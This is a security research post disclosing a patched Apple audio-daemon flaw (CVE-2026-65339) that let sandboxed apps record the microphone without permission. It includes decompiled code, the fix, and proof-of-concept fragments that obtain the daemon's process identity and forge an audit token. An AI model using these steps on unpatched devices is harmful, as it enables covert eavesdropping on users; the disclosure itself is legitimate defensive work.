---
title: Who needs permissions and the orange dot that never lit
source: https://rtx.meta.security/exploitation/2026/11/09/CVE-2026-65339.html
source_host: rtx.meta.security
clip_date: 2026-11-19T08:11:21+08:00
trace_id: db9471e7-96f4-4b9f-9606-b48bec82b455
content_hash: 4c992591e8d29a29e7ce4cd8eda5ceb704f125ed605982c860f8446e0331bc4d
status: synced
tags: []
series: null
feed_source: Meta RTX·Android
ai_summary: null
ai_summary_style: null
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41d75244-d011-81dd-9612-ca20f35cc583
ioc:
  cves:
    - CVE-2014-4492
    - CVE-2026-65339
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

## Impact

On affected systems, a sandboxed app could record microphone audio without a microphone permission grant or special entitlements. On the earlier build analyzed here, the orange microphone indicator stayed off, and the recording was not attributed to the app in the logs.

## Demo

[Download the demo video.](https://rtx.meta.security/assets/videos/CVE-2026-65339/demo.mp4)

The demo includes audio. [Download the MP4 (9.5 MB)](https://rtx.meta.security/assets/videos/CVE-2026-65339/demo.mp4).

**Video note:** This demo was filmed on a later build that appears to have restored the orange microphone indicator. The dot is visible in this recording. The no-indicator behavior described below was observed on the earlier build.

## Summary

Apple’s audio media daemon, `audiomxd`, trusted an audit token supplied by an app when deciding whether that app could record. An audit token identifies a process. In this case, the app could forge the token to impersonate the daemon itself.

That triggered a shortcut intended for audio hosted inside `audiomxd`: if the client appeared to be the daemon, recording was allowed without asking the system’s permission service. The app could then capture microphone audio without a permission grant or an orange indicator.

The microphone permission prompt appeared the first time the app was opened. Declining permission did not prevent recording, and the prompt did not appear again on subsequent launches.

Apple fixed the issue on 10 August 2026 in iOS 27.0 beta 5, and on 17 August 2026 in iOS 26.6.1 / iPadOS 26.6.1 ([HT148282](https://support.apple.com/en-us/148282)) and macOS Tahoe 26.6.2 ([HT148281](https://support.apple.com/en-us/148281)).

Apple’s patch notes describe the issue under Audio:

> **Impact:** An app may be able to leak sensitive user information
> 
> **Description:** A logic issue was addressed with improved checks.

That description leaves out the most striking part: the app could record after permission was denied, without the orange indicator appearing. Here is how it worked.

## Where the permission check went wrong

An app does not decide for itself whether it may record. That decision normally goes through Apple’s Transparency, Consent, and Control system, or TCC, whose daemon is `tccd`. The decision depends on the identity of the process requesting access. A permission check is only useful if that identity is trustworthy.

`audiomxd` runs the server side of `AURemoteIO`, the audio unit used for low-latency audio recording. Its property 2009 is the “client audit token”: a 32-byte value that describes the client process. The daemon exposed a setter for this property. Calling it caused the daemon to copy the app-supplied bytes into its client object and immediately reconsider recording permission.

The daemon then compared that token with its own identity. If the process ID and process version matched, it treated the client as part of `audiomxd` and allowed recording. The app could therefore supply a token naming `audiomxd` and pass the check.

The resulting recording was attributed to the daemon. The logs contained no record of the app using the microphone, and the orange indicator stayed off. This bypass affected microphone capture through this daemon’s audio path; it did not grant the app general TCC permissions.

## Background: audit tokens and process identity

An `audit_token_t` consists of eight 32-bit words. It identifies a process across a Mach or XPC boundary. `libbsm.h` documents the field order in the deprecated `audit_token_to_au32()` function:

| Index | Field |
| --- | --- |
| `val[0]` | Audit user ID (`auid`) |
| `val[1]` | Effective UID |
| `val[2]` | Effective GID |
| `val[3]` | Real UID |
| `val[4]` | Real GID |
| `val[5]` | Process ID (`pid`) |
| `val[6]` | Audit session ID (`asid`) |
| `val[7]` | Process version (`pidversion`) |

Two details matter here.

**The source of the token determines whether it is trustworthy.** When a process receives a Mach message with `MACH_RCV_TRAILER_AUDIT`, the kernel attaches an audit trailer identifying the sender. The sender cannot edit that trailer. Similarly, `xpc_connection_get_audit_token` obtains identity from the connection. An audit token copied from the message body has no such guarantee: the sender controls those bytes.

**A PID alone does not identify a process permanently.** After a process exits, its PID can be reused. A permission decision based only on that number risks confusing the new process with the old one. The `pidversion` field contains XNU’s `p_idversion` counter; the pair `(pid, pidversion)` distinguishes process instances. Knowing the PID alone does not give you the matching version.

This class of mistake has a history. In 2014, Ian Beer found that OS X’s `networkd` trusted an `"effective_audit_token"` value from an XPC message body, allowing a sandboxed caller to choose the identity it presented. Apple fixed it in OS X 10.10.2 as [CVE-2014-4492](https://support.apple.com/en-us/103323); the Project Zero report is [issue 121](https://bugs.chromium.org/p/project-zero/issues/detail?id=121).

A related problem appears in Wojciech Reguła’s 2020 post [Say no to the PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/): a daemon identified its peer using `processIdentifier`, and the caller could re-execute into a signed binary during the request. The usual advice is to use the connection’s kernel-supplied audit token.

`audiomxd` compared audit-token fields, but allowed the client to overwrite the token being checked. That let the app control the identity used to decide whether it could record audio.

## How audiomxd decides whether a client may record

In `AudioToolbox`, each connected `AURemoteIO` client has a server-side `RemoteIOClient` object. At offset `+0x38`, it contains an `AQIONodeClient`, which holds the recording-permission state. That object’s audit token is at its own offset `+0x28`, or `+0x60` within `RemoteIOClient`.

`AQIONodeClient::SetCanRecord()` uses this stored token to decide whether recording is allowed. One path passes it to TCC. Another passes it to `SecTaskCreateWithAuditToken` to check for `com.apple.coreaudio.CanRecordWithoutSessionActivation`.

`audiomxd` has microphone access (`kTCCServiceMicrophone`). It uses its `com.apple.private.tcc.manager.check-by-audit-token` entitlement to ask TCC whether the process identified by the stored audit token has microphone permission.

## The bug: property 2009 replaces the stored identity

`AUIOServer_SetProperty` is the property setter reachable through Mach Interface Generator (MIG) messages. On build `24A5390f`, it is at `0x1b2816264`. It receives the caller’s kernel-supplied audit token as an argument named `a2`. The excerpt below omits the function signature and shows the property-2009 branch. This branch never reads `a2`:

```c
// AudioToolbox, AUIOServer_SetProperty (24A5390f), Hex-Rays
// a2 is the CALLER's audit token, written by the kernel into the MIG trailer.
// The sibling routines mangle as ...j13audit_token_tj, so the type is not a guess.
if ( (_DWORD)a5 != 2009 )              // a5 = property id
  goto LABEL_53;
v24 = *(_OWORD **)(v41 + 40);          // the client's 32-byte payload
v25 = v24[1];
*(_OWORD *)(v17 + 96)  = *v24;         // RemoteIOClient+96
*(_OWORD *)(v17 + 112) = v25;          // RemoteIOClient+112
AQIONodeClient::SetCanRecord((AQIONodeClient *)(v17 + 56));
```

The handler copies 32 bytes from the client into the stored audit token, then calls `SetCanRecord()`. It never checks `a2`, the caller’s real, kernel-supplied audit token. There is no entitlement or code-signing check before the replacement.

## The decision: the client claims to be the daemon

`AQIONodeClient::SetCanRecord()` is at `0x1b2828a30` on the same build:

```c
// AudioToolbox, AQIONodeClient::SetCanRecord (24A5390f), Hex-Rays, tidied.
clientToken = *(int8x16x2_t *)(this + 40);        // this+0x28, written by property 2009

*(_DWORD *)count = 8;                             // TASK_AUDIT_TOKEN_COUNT
if ( task_info(mach_task_self_, 15, ownToken, count) != 0 )   // 15 = TASK_AUDIT_TOKEN
  __break(1u);

*(int8x16x2_t *)scratch = clientToken;            // stage the client's token
clientPid = audit_token_to_pid(scratch);
qmemcpy(scratch, ownToken, 32);                   // overwrite with the daemon's own

if ( clientPid != audit_token_to_pid(scratch)
  || (*(int8x16x2_t *)scratch = clientToken,
      clientPidVer = audit_token_to_pidversion(scratch),
      qmemcpy(scratch, ownToken, 32),
      clientPidVer != audit_token_to_pidversion(scratch)) )
{
  // MISMATCH. Ask TCC -- with the CLIENT-SUPPLIED token as the subject.
  makeTCCAccessRequest(kTCCServiceMicrophone, &clientToken, &opts);
}
else
{
  // MATCH. AQIONode.cpp:341
  // "Recording implicitly allowed for AQIONodeClient %p hosted in audiomxd
  //  with no client audit token."
  canRecord = 1;
}
*(_BYTE *)(this + 20) = canRecord;
// AQIONode.cpp:344  "AQIONodeClient %p: can record: %d"
```

The function reads the stored client token, then asks the kernel for the daemon’s own token. Flavor 15 is `TASK_AUDIT_TOKEN`, as defined in `mach/task_info.h`, so the daemon’s identity comes from a fresh kernel query.

It compares the two tokens’ PIDs and `pidversion` values. If either differs, it asks TCC for a decision. If both match, it sets `canRecord = 1` without asking TCC and logs:

> “Recording implicitly allowed for AQIONodeClient 0x759564c638 hosted in audiomxd with no client audit token.”

The message explains the branch’s purpose: audio hosted inside `audiomxd` has no external client to check. The forged token makes an external app look like that internal case.

The repeated `qmemcpy` calls in the decompilation reuse a scratch buffer to pass the 32-byte tokens by reference. They do not validate either token. The rule is simply:

> If the client’s `(pid, pidversion)` matches mine, treat the client as me and allow recording.

Property 2009 let the app supply a token with `audiomxd` ’s PID and `pidversion`, making the daemon treat the app as itself and allow recording without a TCC check.

### The TCC branch also uses the forged identity

Here is the mismatch path without cleanup:

```c
// AudioToolbox, AQIONodeClient::SetCanRecord (24A5390f), Hex-Rays, unedited
v6 = *MEMORY[0x1E0182E80];
v7 = *(_OWORD *)(v1 + 56);
*(_OWORD *)v20 = *(_OWORD *)(v1 + 40);      // v1+40 = this+0x28, the client's token
*(_OWORD *)&v20[16] = v7;                   // v1+56 = this+0x38, its upper half
v20[32] = 1;
this = makeTCCAccessRequest(v6, v20, &v15);
```

Even when the self-check fails, the daemon asks TCC about the identity supplied by the app. Its `check-by-audit-token` entitlement permits that request. Both branches therefore make a permission decision about an identity the attacker controls.

## Getting the daemon’s PID and process version

To pass the self-check, the app needs both values. A sandboxed container app cannot obtain the daemon’s PID by scanning with `proc_name()`, because the sandbox filters those queries. It also has no direct API for reading the daemon’s `pidversion`.

The audio service provides another way to obtain them. A container app can look up `com.apple.audio.AURemoteIOServer` through `mach-lookup`. If it sends a MIG request whose `msgh_id` matches no routine, the server returns `MIG_BAD_ID`.

The app receives that reply with `MACH_RCV_TRAILER_AUDIT`. The kernel then attaches an audit trailer identifying the reply’s sender: `audiomxd`.

```c
msg.hdr.msgh_id = 0x00C0FFEE;   // no such routine -> MIG_BAD_ID error reply
kr = mach_msg(&msg.hdr,
              MACH_SEND_MSG | MACH_RCV_MSG | MACH_SEND_TIMEOUT | MACH_RCV_TIMEOUT |
              MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |
              MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT),
              sizeof(mach_msg_header_t), sizeof(msg), reply, 1500, MACH_PORT_NULL);

mach_msg_audit_trailer_t *tr = (mach_msg_audit_trailer_t *)
    ((uint8_t *)&msg.hdr + round_msg(msg.hdr.msgh_size));
memcpy(out, &tr->msgh_audit, sizeof(*out));
// out->val[5] = audiomxd pid, out->val[7] = audiomxd pidversion
```

The trusted reply trailer supplies the two fields needed to forge the client token.

There is one iOS 26 detail: enforced reply-port semantics mean a plain receive right cannot serve as a MIG reply port. The proof of concept uses `mig_get_reply_port()`, the same per-thread reply port used by generated MIG stubs.

## Submitting the forged token

The app sets property 2009 through the public `AudioUnitSetProperty` API:

```c
static OSStatus set_forged_token(pid_t pid, uint32_t pidversion) {
    audit_token_t t;
    mach_msg_type_number_t cnt = TASK_AUDIT_TOKEN_COUNT;
    task_info(mach_task_self(), TASK_AUDIT_TOKEN, (task_info_t)&t, &cnt); // asid template
    t.val[0] = 0xFFFFFFFF;                            // auid -1, like a daemon
    t.val[1] = t.val[2] = t.val[3] = t.val[4] = 501;  // mobile
    t.val[5] = (unsigned)pid;                         // audiomxd's pid
    t.val[7] = pidversion;                            // audiomxd's pidversion
    return AudioUnitSetProperty(g_au, 2009, kAudioUnitScope_Global, 0, &t, sizeof(t));
}
```

The app can read `pidversion` directly from the reply trailer, but guessing it also worked. While audio I/O was running, incorrect tokens produced silence and the correct token produced live microphone audio. Trying values from 0 to 1023 found a match in about 70 seconds. Other runs may need a wider search.

## The orange indicator on the earlier build

Apple’s [iPhone User Guide](https://support.apple.com/en-us/108331) describes the expected behavior:

> “An orange indicator appears at the top of the screen whenever an app uses the microphone without the camera.”

On the earlier build, no orange indicator appeared during recording. The microphone was open and audio was being written to disk, but the status bar showed no sign of microphone use.

## Test setup and app requirements

The analysis compared iOS 27.0 beta 4 (`24A5390f`), which was vulnerable, with beta 6 (`24A5418b`), which contained the fix. The release timeline below records the fix’s availability in beta 5.

The app still needs `NSMicrophoneUsageDescription` in its `Info.plist`. This key supplies text for a microphone permission prompt; it does not grant permission. Without it, the client-side library aborts the process at `AudioUnitInitialize`. Its presence satisfies that client-side requirement, but does not prevent the server-side permission bypass described here.

## The fix

In build `24A5418b`, the property handler checks `a2`, the caller’s audit token that the vulnerable branch ignored:

```c
// AudioToolbox, AUIOServer_SetProperty (24A5418b), Hex-Rays
// a2 is the CALLER's audit token, written by the kernel into the MIG trailer.
if ( (_DWORD)a5 != 2009 )
  goto LABEL_28;
if ( (*(_QWORD *)a2 & *((_QWORD *)a2 + 1) & (_QWORD)a2[1] & *((_QWORD *)a2 + 3)) == -1
  || (HasBooleanEntitlement((const audit_token_t *)a2, v18) & 1) != 0 )
{
  v25 = *(_OWORD **)(v43 + 40);
  v26 = v25[1];
  *(_OWORD *)(v17 + 96)  = *v25;
  *(_OWORD *)(v17 + 112) = v26;
  AQIONodeClient::SetCanRecord((AQIONodeClient *)(v17 + 56));
}
```

The token copy and the `SetCanRecord()` call are unchanged. The fix wraps them in an `if` statement, adding eight machine-code instructions. Here, `v18` is `com.apple.private.audio.client-audit-token-override`, a private entitlement that an app cannot grant itself.

Crucially, the gate checks `a2`: the caller’s real audit token from the kernel-supplied MIG trailer. It now asks whether the actual caller is allowed to override the stored client identity.

The first part of the condition combines the four 64-bit words of `a2` with bitwise AND. If all bits are set, it skips the entitlement check. This recognizes the `INVALID_AUDIT_TOKEN` sentinel used for the daemon’s own in-process clients, which have no external peer to identify. A remote caller cannot supply that value in `a2`, because the kernel supplies the caller’s token.

The fix preserves the internal shortcut while restricting who can replace the client identity it relies on.

## Timeline

| Date | Event |
| --- | --- |
| 2026-07-07 | Reported to Apple |
| 2026-08-10 | Fixed in iOS 27 beta 5 |
| 2026-08-17 | Fixed in [iOS 26.6.1 / iPadOS 26.6.1](https://support.apple.com/en-us/148282) and [macOS Tahoe 26.6.2](https://support.apple.com/en-us/148281); assigned CVE-2026-65339 |
| 2026-09-14 | Fixed in [macOS Sequoia 15.8](https://support.apple.com/en-us/149043) |
| 2026-09-14 | Fixed in [tvOS 27](https://support.apple.com/en-us/149036) |
| 2026-09-14 | Fixed in [watchOS 27](https://support.apple.com/en-us/149037) |
| 2026-09-14 | Fixed in [visionOS 27](https://support.apple.com/en-us/149038) |
| 2026-10-26 | Fixed in [iOS 18.7.11 / iPadOS 18.7.11](https://support.apple.com/en-us/149225) |
| 2026-11-09 | Scheduled publication of this post |

Thank you to Luke McLaren ([@datalocaltmp](https://twitter.com/datalocaltmp)) for sharing his knowledge so generously. I’ve learned a lot from him.
